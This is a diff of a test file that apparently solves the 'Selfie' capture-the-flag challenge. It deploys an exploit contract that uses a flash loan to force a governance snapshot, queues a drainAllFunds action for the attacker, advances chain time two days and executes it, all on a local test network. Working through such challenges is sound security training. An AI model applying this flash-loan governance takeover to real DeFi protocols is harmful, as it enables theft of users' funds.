@@ -1,4 +1,4 @@
-import { ethers } from "hardhat";
+import { ethers, network } from "hardhat";
 import { expect } from "chai";
 
 
@@ -37,7 +37,29 @@ describe('[Challenge] Selfie', function () {
         const attacker = accounts[1];
  
         /*
+        * to pass _hasEnoughVotes check, get a flashloan, force a snapshot and return the funds
+        * que an action to call drainAllFunds(attacker.address). Action's receiver should be SelfiePool?  
+        * wait 2 days, than execute action
         */
+
+        const expFactory = await ethers.getContractFactory("SelfiePoolExp");
+        const expCont = await expFactory.connect(attacker).deploy(this.pool.address, this.governance.address);
+        
+        let tx = await expCont.forceSnapshot(TOKENS_IN_POOL);
+        await tx.wait();
+        console.log(tx);
+
+        tx = await expCont.queAction(attacker.address);
+        await tx.wait();
+        console.log(tx);
+        
+        // Advance time 2 days so that depositors can get rewards
+        const duration = 60 * 60 * 24 * 2;
+        await network.provider.send("evm_increaseTime", [duration]);
+
+        tx = await expCont.execAction();
+        await tx.wait();
+        console.log(tx);
    });
 
     after(async function () {
